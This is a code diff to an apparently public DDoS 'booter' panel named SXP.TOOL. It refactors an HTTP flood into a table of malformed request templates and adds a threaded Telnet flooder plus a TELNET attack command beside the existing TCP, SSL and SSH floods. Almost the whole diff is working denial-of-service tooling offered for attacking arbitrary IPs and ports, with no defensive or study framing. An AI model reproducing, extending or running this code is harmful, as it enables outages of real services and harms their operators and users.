@@ -1,5 +1,5 @@
 from colored import fg,bg,attr
-import socket,ssl,threading,random,string,sys,warnings,time,requests,socks
+import socket,ssl,threading,random,string,sys,warnings,time,requests,socks,telnetlib
 from urllib.parse import urlparse
 import platform,os
 import paramiko
@@ -150,39 +150,31 @@ def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
     path_get = ['PY_FLOOD','CHOICES_FLOOD']
     path_get_loader = random.choice((path_get))
     if path_get_loader == "PY_FLOOD":
-        url_path = generate_url_path(5)
+        url_path = f'/{generate_url_path(5)}'
     else:
-        url_path = generate_url_path_choice(5)
+        url_path = f'/{generate_url_path_choice(5)}'
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     try:
-        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
-        elif data_type_loader_packet == 'OWN1':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
-        elif data_type_loader_packet == 'OWN2':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
-        elif data_type_loader_packet == 'OWN3':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
-        elif data_type_loader_packet == 'OWN4':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
-        elif data_type_loader_packet == 'OWN5':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
-        elif data_type_loader_packet == 'OWN6':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
-        elif data_type_loader_packet == 'OWN7':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
-        elif data_type_loader_packet == 'OWN8':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
-        elif data_type_loader_packet == 'TEST':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
-        elif data_type_loader_packet == 'TEST2':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
-        elif data_type_loader_packet == 'TEST3':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n".encode()
-        elif data_type_loader_packet == 'TEST4':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
-        elif data_type_loader_packet == 'TEST5':
-            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
+        packet_formats = {
+    'PYF': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\n",
+    'OWN1': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
+    'OWN2': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
+    'OWN3': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\r\n",
+    'OWN4': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\n\n\n",
+    'OWN5': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r",
+    'OWN6': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n",
+    'OWN7': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\r\n\r",
+    'OWN8': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r",
+    'TEST': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n",
+    'TEST2': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n",
+    'TEST3': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n",
+    'TEST4': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r",
+    'TEST5': "{type_attack} {url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r"
+       }
+        
+        d = data_type_loader_packet.replace('PY','PYF')
+        packet_data = packet_formats.get(d, "").format(type_attack=type_attack,url_path=url_path,host=host).encode()
+
         s.connect((ip,port))
         for _ in range(booter_sent):
             if stop_command:
@@ -212,6 +204,28 @@ def TCP_ATTACK(ip,port,spam_send,booter,size):
             s.send(os.urandom(size))
     except:
        pass
+
+def telnet_flooder(hostname, port,time,size):
+    global stop_command
+    try:
+        for _ in range(int(time)):
+         if stop_command:
+          break
+         with telnetlib.Telnet(hostname, port, timeout=2) as tn:
+          tn.write(f'{genPass("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~)-$(@#", size)}'.encode())
+    except:
+       pass
+
+def atk_telnet(IP,PORT,TIME,BOOTER,size):
+   global stop_command
+   for _ in range(TIME):
+    if stop_command:
+          break
+    threading.Thread(target=telnet_flooder,args=(IP,PORT,BOOTER,size)).start()
+    threading.Thread(target=telnet_flooder,args=(IP,PORT,BOOTER,size)).start()
+    threading.Thread(target=telnet_flooder,args=(IP,PORT,BOOTER,size)).start()
+    threading.Thread(target=telnet_flooder,args=(IP,PORT,BOOTER,size)).start()
+    threading.Thread(target=telnet_flooder,args=(IP,PORT,BOOTER,size)).start()
 
 def SSL_PACKET(target,methods,duration_sec_attack_dude):
     global stop_command
@@ -522,7 +536,7 @@ def CLI_COLOR(mode):
        print(f'{fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}] {fg(202)}WELCOME {fg(203)}TO {fg(204)}SXP.TOOL {fg(205)}PANEL {fg(196)}[ {fg(40)}S{fg(41)}X{fg(42)}P{fg(165)} {fg(196)}]{attr(0)}')
        time.sleep(1.5)
     elif mode == 'l4':
-       print(f'''{fg(196)}          ╔═╗{fg(197)}═╗ ╦{fg(198)}╔═╗{fg(199)}┌┬┐{fg(200)}┌─┐{fg(201)}┌─┐{fg(207)}┬  \n{fg(196)}          ╚═╗{fg(197)}╔╩╦╝{fg(198)}╠═╝ {fg(199)}│ {fg(200)}│ │{fg(201)}│ │{fg(207)}│  \n{fg(196)}          ╚═╝{fg(197)}╩ ╚═{fg(198)}╩ {fg(210)}o {fg(199)}┴{fg(200)} └─┘{fg(201)}└─┘{fg(207)}┴─┘\n  {fg(160)}╔═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╗\n{fg(214)}▀ {fg(160)}║ {fg(213)}━ {fg(212)}━ {fg(211)}━ {fg(210)}━ {fg(209)}━ {fg(196)}MET{fg(197)}HODS {fg(198)}LAY{fg(199)}ER4 {fg(209)}━ {fg(210)}━ {fg(211)}━ {fg(212)}━ {fg(213)}━ {fg(163)}║ {fg(214)}▀\n{fg(196)}█ {fg(160)}╚═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╝ {fg(196)}█\n{fg(197)}╚═══════╗ ╔═══════════════════╗ ╔════════╝\n{fg(198)}  ▀═══╗ ║▀║    {fg(202)}TCP {fg(203)}UDP {fg(204)}TUP    {fg(198)}║▀║ ╔═══▀\n{fg(199)}    ╗ ║ ║█║    {fg(208)}SYN {fg(209)}SSH_FLOOD  {fg(199)}║█║ ║ ╔\n{fg(200)}      ▀ ║ ╚═══════════════════╝ ║ ▀ \n{fg(201)}        ▀═══════════════════════▀{attr(0)}''')
+     print(f'''{fg(196)}          ╔═╗{fg(197)}═╗ ╦{fg(198)}╔═╗{fg(199)}┌┬┐{fg(200)}┌─┐{fg(201)}┌─┐{fg(207)}┬  \n{fg(196)}          ╚═╗{fg(197)}╔╩╦╝{fg(198)}╠═╝ {fg(199)}│ {fg(200)}│ │{fg(201)}│ │{fg(207)}│  \n{fg(196)}          ╚═╝{fg(197)}╩ ╚═{fg(198)}╩ {fg(210)}o {fg(199)}┴{fg(200)} └─┘{fg(201)}└─┘{fg(207)}┴─┘\n  {fg(160)}╔═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╗\n{fg(214)}▀ {fg(160)}║ {fg(213)}━ {fg(212)}━ {fg(211)}━ {fg(210)}━ {fg(209)}━ {fg(196)}MET{fg(197)}HODS {fg(198)}LAY{fg(199)}ER4 {fg(209)}━ {fg(210)}━ {fg(211)}━ {fg(212)}━ {fg(213)}━ {fg(163)}║ {fg(214)}▀\n{fg(196)}█ {fg(160)}╚═════════════{fg(161)}══════════════{fg(162)}═════════{fg(163)}╝ {fg(196)}█\n{fg(197)}╚═══════╗ ╔═══════════════════╗ ╔════════╝\n{fg(198)}  ▀═══╗ ║▀║    {fg(202)}TCP {fg(203)}UDP {fg(204)}TUP    {fg(198)}║▀║ ╔═══▀\n{fg(199)}    ╗ ║ ║█║    {fg(208)}SYN {fg(209)}SSH TELNET {fg(199)}║█║ ║ ╔\n{fg(200)}      ▀ ║ ╚═══════════════════╝ ║ ▀ \n{fg(201)}        ▀═══════════════════════▀{attr(0)}''')
     elif mode == 'main_banner':
      print(f"""{fg(40)}        ╔═╗{fg(41)}═╗ ╦{fg(42)}╔═╗{fg(43)}┌┬┐{fg(44)}┌─┐{fg(45)}┌─┐{fg(80)}┬  \n{fg(40)}        ╚═╗{fg(41)}╔╩╦╝{fg(42)}╠═╝{fg(43)} │ {fg(44)}│ │{fg(45)}│ │{fg(80)}│  \n{fg(40)}        ╚═╝{fg(41)}╩ ╚═{fg(42)}╩ {fg(7)}o{fg(43)} ┴ {fg(44)}└─┘{fg(45)}└─┘{fg(80)}┴─┘\n{fg(41)}╔══════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╗╗\n{fg(41)}║    {fg(40)}  WELCOME{fg(41)} GUY {fg(42)}TO {fg(43)}PANEL {fg(44)}SXPTOOL{fg(75)}     ║║\n{fg(41)}╚═╦════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╩╬╗\n{fg(41)}  ╚══╦═{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}══════╩╩══╗╗\n{fg(41)}     ║   {fg(40)}Type {fg(41)}<{fg(42)}help{fg(41)}> {fg(43)}for show {fg(44)}some command  {fg(75)} ║║\n{fg(41)}  ╔══╩═{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═╦╦═══════╝╝\n{fg(41)}╔═╩════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═╩╩══╗╗\n{fg(41)}║ {fg(214)}━ {fg(184)}━ {fg(40)}https://{fg(41)}discord.gg{fg(42)}/CcX9KDRhPT {fg(184)}━{fg(214)} ━{fg(75)} ║║\n{fg(41)}╚══════{fg(43)}═════════════{fg(45)}═══════════════{fg(75)}═════╝╝\n{fg(196)}Copyright © {fg(166)}2023 Hex1629. {fg(136)}GUI Rights Reserved. {attr(0)}\n""")
     elif mode == 'l7' or mode == 'l7':
@@ -754,7 +768,21 @@ def PANEL_USE():
           CLI_COLOR('atk')
        else:
           print(f'{fg(40)}HIT {fg(41)}890+ {fg(42)}MB {fg(43)}PUT {fg(44)}64999 {fg(45)}IN {fg(50)}SIZE {fg(51)}( SUPPORT ONLY CLOUDSHELL )\n{fg(196)}UDP {fg(197)}<IP> {fg(198)}<PORT> {fg(199)}<TIME> {fg(200)}<BOOTER> {fg(201)}<SIZE>{attr(0)}')
-    elif arg_load[0] == 'SSH_FLOOD':
+    elif arg_load[0] == 'TELNET':
+        if len(arg_load) == 6:
+          IP = str(arg_load[1])
+          PORT = int(arg_load[2])
+          TIME = int(arg_load[3])
+          BOOTER = int(arg_load[4])
+          SIZE = int(arg_load[5])
+          threading.Thread(target=atk_telnet,args=(IP,PORT,TIME,BOOTER,SIZE)).start()
+          target_load = IP
+          port_load = PORT
+          methods_load = 'TELNET'
+          CLI_COLOR('atk')
+        else:
+         print(f'{fg(196)}TELNET {fg(197)}<IP> {fg(198)}<PORT> {fg(199)}<TIME> {fg(200)}<BOOTER> {fg(201)}<SIZE>{attr(0)}')
+    elif arg_load[0] == 'SSH':
        if len(arg_load) == 8:
           IP = str(arg_load[1])
           PORT = int(arg_load[2])
@@ -772,7 +800,7 @@ def PANEL_USE():
                 break
              threading.Thread(target=FLOODING,args=(IP,PORT,TIME,SIZE,BOOTER,THR_C)).start()
        else:
-          print(f'{fg(196)}SSH_FLOOD {fg(197)}<IP> {fg(198)}<PORT> {fg(199)}<TIME> {fg(200)}<SIZE> {fg(201)}<BOOTER> {fg(202)}<THREAD> {fg(203)}<CREATE>{attr(0)}')
+          print(f'{fg(196)}SSH {fg(197)}<IP> {fg(198)}<PORT> {fg(199)}<TIME> {fg(200)}<SIZE> {fg(201)}<BOOTER> {fg(202)}<THREAD> {fg(203)}<CREATE>{attr(0)}')
           print(f'{fg(70)}BETTER {fg(71)}SIZE {fg(72)}IT {fg(73)}200000{attr(0)}')
     elif arg_load[0] == 'EXEC':
        mode_attack = input("LOAD SCRIPT (FILES or INPUT) $").upper()
